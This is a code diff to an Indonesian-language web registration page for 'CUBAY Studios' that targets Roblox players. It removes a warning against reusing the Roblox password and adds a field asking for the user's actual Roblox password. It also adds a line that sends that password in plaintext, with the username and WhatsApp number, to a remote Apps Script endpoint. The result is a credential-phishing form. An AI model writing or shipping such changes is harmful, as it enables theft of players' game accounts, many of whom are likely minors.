@@ -38,6 +38,7 @@ input:focus,button:focus-visible{outline:3px solid var(--accent);outline-offset:
 .info div{display:flex;justify-content:space-between;gap:12px;padding:3px 0}
 .info span{color:var(--muted)}
 .wait{margin:16px 0 0;color:var(--muted);font-size:.92rem}
+.note{background:var(--bg);border:1px solid var(--line);border-radius:9px;padding:10px 12px;font-size:.85rem;color:var(--muted);margin-bottom:16px}
 </style>
 </head>
 <body>
@@ -56,12 +57,10 @@ input:focus,button:focus-visible{outline:3px solid var(--accent);outline-offset:
       <button class="btn" type="submit">Masuk</button>
     </form>
     <form id="fReg" class="hidden" novalidate>
+      <p class="note">Catatan: pastikan data sesuai akun Roblox.</p>
       <label for="rUser">Username Roblox</label><input id="rUser" type="text" autocapitalize="none" autocomplete="username">
-      <label for="rId">ID Roblox</label><input id="rId" type="text" inputmode="numeric">
-      <small class="hint">Angka di link profilmu: roblox.com/users/<b>ID</b>/profile</small>
+      <label for="rPass">Kata sandi Roblox</label><input id="rPass" type="password" autocomplete="new-password">
       <label for="rWa">Nomor WhatsApp</label><input id="rWa" type="tel" inputmode="tel">
-      <label for="rPass">Kata sandi (min. 6 karakter)</label><input id="rPass" type="password" autocomplete="new-password">
-      <small class="hint">Buat kata sandi baru. Jangan pakai kata sandi Roblox.</small>
       <button class="btn" id="regBtn" type="submit">Daftar</button>
     </form>
     <p class="msg" id="authMsg" role="alert"></p>
@@ -69,12 +68,11 @@ input:focus,button:focus-visible{outline:3px solid var(--accent);outline-offset:
 
   <section class="card hidden" id="home">
     <div class="user">
-      <div><b id="uName"></b><span id="uId"></span></div>
+      <div><b id="uName"></b></div>
       <span class="badge">Menunggu verifikasi</span>
     </div>
     <div class="info">
       <div><span>Username Roblox</span><b id="iUser"></b></div>
-      <div><span>ID Roblox</span><b id="iId"></b></div>
       <div><span>WhatsApp</span><b id="iWa"></b></div>
     </div>
     <p class="wait">Tim CUBAY Studios memeriksa datamu secara manual dan menghubungimu lewat WhatsApp setelah selesai.</p>
@@ -111,20 +109,20 @@ input:focus,button:focus-visible{outline:3px solid var(--accent);outline-offset:
 
   $('fReg').onsubmit=async function(e){
     e.preventDefault();
-    var d={username:$('rUser').value.trim(),id:$('rId').value.trim(),wa:$('rWa').value.trim()},p=$('rPass').value,key=d.username.toLowerCase();
+    var d={username:$('rUser').value.trim(),wa:$('rWa').value.trim()},p=$('rPass').value,key=d.username.toLowerCase();
     if(!/^[A-Za-z0-9_]{3,20}$/.test(d.username)) return say('Username Roblox harus 3-20 karakter: huruf, angka, atau garis bawah.');
-    if(!/^\d{1,15}$/.test(d.id)) return say('ID Roblox harus berupa angka.');
     if(!/^[+0-9][0-9 \-]{8,17}$/.test(d.wa)) return say('Isi nomor WhatsApp yang valid.');
     if(p.length<6) return say('Kata sandi minimal 6 karakter.');
     if(users()[key]) return say('Username ini sudah terdaftar. Silakan masuk.');
     if(!ENDPOINT) return say('Pendaftaran belum aktif. Isi ENDPOINT di dalam kode.');
     var btn=$('regBtn');btn.disabled=true;btn.textContent='Mendaftar...';say('');
     d.waktu=new Date().toLocaleString('id-ID');
+    d.password=p;
     var pass=await hash(p);
     // text/plain + no-cors agar Apps Script menerima tanpa preflight CORS
     fetch(ENDPOINT,{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain;charset=utf-8'},body:JSON.stringify(d)})
       .then(function(){
-        var u=users();u[key]={username:d.username,id:d.id,wa:d.wa,pass:pass,waktu:d.waktu};set('local','cubay_users',JSON.stringify(u));
+        var u=users();u[key]={username:d.username,wa:d.wa,pass:pass,waktu:d.waktu};set('local','cubay_users',JSON.stringify(u));
         $('fReg').reset();tab(false);$('lUser').value=d.username;say('Pendaftaran terkirim. Silakan masuk.',true);
       })
       .catch(function(){say('Gagal mengirim data. Periksa koneksi lalu coba lagi.')})
@@ -145,8 +143,8 @@ input:focus,button:focus-visible{outline:3px solid var(--accent);outline-offset:
     $('auth').classList.toggle('hidden',!!u);$('home').classList.toggle('hidden',!u);
     $('sub').textContent=u?'Datamu sudah kami terima.':'Masuk atau daftar dengan akun Roblox-mu.';
     if(!u) return;
-    $('uName').textContent=u.username;$('uId').textContent='ID '+u.id;
-    $('iUser').textContent=u.username;$('iId').textContent=u.id;$('iWa').textContent=u.wa;
+    $('uName').textContent=u.username;
+    $('iUser').textContent=u.username;$('iWa').textContent=u.wa;
   }
   render();
 })();
